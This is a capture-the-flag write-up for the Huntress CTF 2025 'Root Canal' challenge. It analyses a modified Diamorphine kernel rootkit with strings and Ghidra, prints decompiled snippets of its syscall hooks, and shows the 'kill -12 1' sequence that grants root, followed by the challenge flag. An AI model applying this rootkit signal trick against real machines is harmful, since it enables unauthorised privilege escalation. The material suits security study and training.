# Root Canal

<em>
But what is the real root of the issue?
</em>

Root Canal was a miscellaneous challenge in the Huntress CTF 2025. We were given credentials to log into a Linux system as the user `ctf`. On login, we found a `README.txt` in our home directory.

```
ctf@ip-10-1-142-194:~$ cat README.txt 
Once you fix your root your root canal, you'll see a new directory here!
Do some reconnaissance and you'll find the real root of the issue :)
```

I looked for low hanging fruit - `sudoers` misconfiguration, uid 0 user accounts, setuid binaries etc and didn't manage to find anything. I checked cron jobs in case there was something I could hijack.

```
ctf@ip-10-1-142-194:/etc/cron.d$ cat diamorphine 

SHELL=/bin/bash

PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

@reboot root cp -a /opt/.diamorphine/. /dev/shm/ && insmod /dev/shm/diamorphine.ko || true
```

As far as things I could hijack goes, that was pretty high on the list. [Diamorphine](https://github.com/m0nad/Diamorphine) is a Linux kernel rootkit. It is deployed as kernel module that removes itself from from the kernel's list of loaded modules to stay undetected. It hooks a set of syscalls including sys.kill and getdents64. This allows the operator to hide files or directories with a prefix they choose and elevate to root at any time by sending a kill signal that is intercepted by diamorphine.

I investigated the files in the `/opt/.diamorphine/` directory. There was no source code present, but I used strings on the kernel module to try and get some idea of what it was configured to hide.

```
ctf@ip-10-1-142-194:~/squiblydoo$ cd /opt/.diamorphine/
ctf@ip-10-1-142-194:/opt/.diamorphine$ ls
diamorphine.ko  diamorphine.mod  diamorphine.mod.c  diamorphine.mod.o  diamorphine.o  modules.order  Module.symvers

ctf@ip-10-1-142-194:~$ strings /opt/.diamorphine/diamorphine.ko 
AWAVAUATSH
squiblydI9E
[A\A]A^A_]
[A\A]A^A_]
AWAVAUATSH
squiblydI9E
[A\A]A^A_]
[A\A]A^A_]
GhUH
eH34%(
squiblydoo
./include/linux/thread_info.h
sys_call_table
description=LKM rootkit
author=m0nad
license=Dual BSD/GPL
srcversion=D406AF25A2A94EADDEDDC4C
depends=
retpoline=Y
```

**squiblydoo** looked pretty suspicious - I confirmed the hidden directory from the README.txt was indeed named squiblydoo.

```
ctf@ip-10-1-142-194:~$ pwd
/home/ctf
ctf@ip-10-1-142-194:~$ ls -lah squiblydoo
ls: cannot open directory 'squiblydoo': Permission denied
ctf@ip-10-1-142-194:~$ ls -d squiblydoo
squiblydoo
ctf@ip-10-1-142-194:~$ ls -lad squiblydoo
d--------- 2 root root 4096 Sep 26 14:12 squiblydoo
```
This directory was owned by root with no permissions. The only way to see what was inside was to elevate my privileges. This took much longer than it should have, as this build of diamorphine was modified for the challenge. In one way this made it easier - the function that should have removed all traces of the diamorphine module had been modified so it was detectable in `/sys/module`

```
ctf@ip-10-1-142-194:/opt/.diamorphine$ ls /sys/module/
8250               configfs          fb                   kernel         parport      rfkill                usbcore
acpi               cpufreq           firmware_class       keyboard       parport_pc   rng_core              virtio_mmio
acpi_cpufreq       cpuidle           fscrypto             kgdb_nmi       pata_sis     rtc_cmos              virtio_pci
acpiphp            crc32_pclmul      fuse                 kgdboc         pcie_aspm    sch_fq_codel          virtual_root
aesni_intel        crc_t10dif        ghash_clmulni_intel  libata         pciehp       scsi_mod              vt
apparmor           crct10dif_pclmul  glue_helper          libcrc32c      pci_hotplug  scsi_transport_iscsi  watchdog
async_memcpy       cryptd            gpiolib_acpi         libiscsi       ppdev        serio_raw             workqueue
async_pq           cryptomgr         haltpoll             libiscsi_tcp   ppp_generic  sg                    xen
async_raid6_recov  crypto_simd       i8042                libnvdimm      printk       shpchp                xen_acpi_processor
async_tx           debug_core        ib_cm                linear         processor    slab_common           xen_blkfront
async_xor          diamorphine       ib_core              loop           pstore       spurious              xhci_hcd

```

On the other hand, this custom build was not responding to the default signals. After trying some by hand I decided to grab the kernel module and analyse it in Ghidra offline.

```c

hacked_kill

iVar3 = (int)*(undefined8 *)(param_1 + 0x68);  
if (iVar3 == 0xc) {   // 0xc = 12 (give root)
    give_root();
    return 0;
}
if (iVar3 != 0xd) {   // 0xd = 13 (toggle process)
    if (iVar3 != 0xb) {  // 0xb = 11 (toggle module)
        uVar4 = (*orig_kill)();
        return uVar4;
    }
```

Here was the answer - the hacked kill module used signals 11, 12 and 13 instead of the default 31, 63 and 64. 

```c

hacked_getdents64

        else {
          if ((*(long *)((long)pvVar1 + 0x13) == 0x64796c6269757173) && // squiblyd
             (*(short *)((long)pvVar1 + 0x1b) == 0x6f6f)) { // oo !
            if (pvVar1 == __dest) goto LAB_001001f8;
```  
            
Here we can also see the string **squiblydoo** defined as our hiding prefix.

With the correct signals the rest of the challenge was straightforward. It was not necessarily to remove the diamorphine kernel module - since the hidden directory was only masked from being listed, accessing the flag directory would work as long as the user had the correct permissions.

```
ctf@ip-10-1-142-194:~$ kill -12 1
ctf@ip-10-1-142-194:~$ id
uid=0(root) gid=0(root) groups=0(root),1001(ctf)

ctf@ip-10-1-142-194:~$ kill -11 1
ctf@ip-10-1-142-194:~$ lsmod | grep dia
diamorphine            16384  0

ctf@ip-10-1-142-194:~$ rmmod diamorphine

ctf@ip-10-1-142-194:~$ ls -l
total 56
-rw-r--r-- 1 ctf  ctf    142 Sep 26 14:12 README.txt
-rw-rw-r-- 1 ctf  ctf  40960 Nov  1 07:15 rootkit.tar
d--------- 2 root root  4096 Sep 26 14:12 squiblydoo
-rw-rw-r-- 1 ctf  ctf   5014 Oct 31 21:27 test.sh

ctf@ip-10-1-142-194:~$ cat squiblydoo/flag.txt
flag{ce56efc41f0c7b45a7e32ec7117cf8b9}
```
